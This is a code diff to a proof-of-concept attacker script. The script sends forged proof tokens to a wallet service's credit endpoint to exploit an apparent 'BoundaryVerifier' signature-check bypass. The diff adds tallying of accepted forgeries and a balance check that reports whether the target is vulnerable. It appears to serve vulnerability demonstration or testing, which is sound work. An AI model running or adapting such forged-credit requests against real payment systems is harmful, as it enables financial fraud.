@@ -61,6 +61,8 @@ def main() -> int:
     print(f"[attacker] Target: {args.url}")
     print(f"[attacker] No signing key. No grant. No relationship with the issuer. Let's go.\n")
 
+    successes = 0
+    expected_gain = 0
     for round_number in range(1, args.rounds + 1):
         forged_token = forge_proof_token()
         payload = {
@@ -76,11 +78,25 @@ def main() -> int:
         balance = response.get("balance_minor")
         print(f"[round {round_number}] forged_token={forged_token[:24]}... "
               f"-> HTTP {status}, ok={ok}, balance_minor={balance}")
+        if status == 200 and ok is True:
+            successes += 1
+            expected_gain += args.amount
 
     final = get_json(f"{args.url}/wallet/balance?account_id={args.account}")
     total = final["balance_minor"]
-    print(f"\n[attacker] Final balance for '{args.account}': {total} minor units "
+    print(f"\n[attacker] {successes}/{args.rounds} forged credit(s) were accepted by the target.")
+    print(f"[attacker] Final balance for '{args.account}': {total} minor units "
           f"({total / 100:.2f} in major currency units)")
+
+    if successes == 0:
+        print("[attacker] None of the forged requests were accepted — this target does not "
+              "appear vulnerable to the BoundaryVerifier bypass (or is unreachable/misconfigured).")
+        return 1
+    if total < expected_gain:
+        print(f"[attacker] Only {total} of the expected {expected_gain} minor units landed in "
+              f"the account — the bypass is partial or the ledger doesn't match the responses.")
+        return 1
+
     print("[attacker] None of this was ever signed by a real key. "
           "The 'proof' was random bytes accepted as valid at the resource boundary.")
     return 0
